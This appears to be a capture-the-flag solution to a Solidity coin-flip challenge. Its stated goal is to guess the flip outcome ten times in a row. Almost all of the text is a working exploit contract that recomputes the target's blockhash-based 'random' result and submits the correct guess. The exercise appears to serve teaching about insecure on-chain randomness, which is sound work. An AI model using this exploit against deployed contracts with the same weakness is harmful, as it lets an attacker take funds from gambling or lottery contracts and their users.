# Answer

Goal: Guess flip outcome 10 times in a row.

## 1. Guessing the flip outcome

The ```flip()``` outcome can be pre-calculated before the function call using a wrapper contract and guessed correct every time:

```solidity
contract CoinFlipExploit {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip c;

    event FlipResult(bool r);

    constructor (address coinFlipAddr) {
        c = CoinFlip(coinFlipAddr);
    }

    function exploit() external {
        bool calculatedGuess = getFlipResult();
        emit FlipResult(c.flip(calculatedGuess));
    }

    function getFlipResult() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1;
    }
}
```